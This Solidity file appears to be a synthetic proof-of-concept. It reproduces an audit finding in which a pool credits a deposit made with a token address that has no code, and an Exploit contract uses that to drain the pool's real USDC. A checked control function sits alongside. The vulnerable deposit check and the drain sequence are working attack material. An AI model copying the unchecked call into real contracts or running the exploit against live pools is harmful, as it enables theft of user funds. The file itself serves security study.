// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Meson — _unsafeDepositToken treats a codeless token as a successful transferFrom
    (Trail of Bits, TOB-MES-10, Oct 2022).
    SYNTHETIC, cheatcode-free reduction.
    The pool already holds 1000 USDC. postSwap calls transferFrom on an address with no
    code. The EVM returns success and empty data, the credit mapping increases by 1000 USDC,
    and no USDC moves. withdraw then sends the pool's real 1000 USDC to the caller.
    The control requires token.code.length > 0 and the post reverts. */

contract Usdc {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        name = "USDC";
        symbol = "USDC";
        decimals = 6;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MesonPool {
    uint256 public constant AMOUNT = 1000e6;

    Usdc public usdc;
    mapping(address => uint256) public credit;

    constructor(Usdc usdc_) {
        usdc = usdc_;
    }

    function _unsafeDepositToken(address token, address sender, uint256 amount) internal {
        require(token != address(0), "Token not supported");
        require(amount > 0, "Amount must be greater than zero");
        // @> VULN: call on a codeless token returns success with empty data, which this require accepts
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(0x23b872dd), sender, address(this), amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }

    function postSwap(address token, uint256 amount) external {
        _unsafeDepositToken(token, msg.sender, amount);
        credit[msg.sender] += amount;
    }

    function postSwapChecked(address token, uint256 amount) external {
        require(token.code.length > 0, "no contract");
        _unsafeDepositToken(token, msg.sender, amount);
        credit[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        credit[msg.sender] -= amount;
        usdc.transfer(msg.sender, amount);
    }
}

contract Exploit {
    Usdc public usdc; // nonce 1
    MesonPool public pool; // nonce 2

    address public constant CODELESS = address(uint160(0xdead));

    uint256 public credited;
    uint256 public usdcWhileCredited;
    uint256 public codeSize;
    uint256 public withdrawn;

    constructor() {
        usdc = new Usdc();
        pool = new MesonPool(usdc);
        usdc.mint(address(pool), 1000e6);
    }

    function run() external {
        codeSize = CODELESS.code.length;
        pool.postSwap(CODELESS, 1000e6);
        credited = pool.credit(address(this));
        usdcWhileCredited = usdc.balanceOf(address(pool));
        pool.withdraw(1000e6);
        withdrawn = usdc.balanceOf(address(this));
        require(codeSize == 0, "token has code");
        require(credited == 1000e6, "credit");
        require(usdcWhileCredited == 1000e6, "usdc moved on the fake deposit");
        require(withdrawn == 1000e6, "real usdc not withdrawn");
        require(usdc.balanceOf(address(pool)) == 0, "pool not drained");
    }

    function runControl() external returns (bool posted) {
        try pool.postSwapChecked(CODELESS, 1000e6) {
            posted = true;
        } catch {
            posted = false;
        }
    }
}
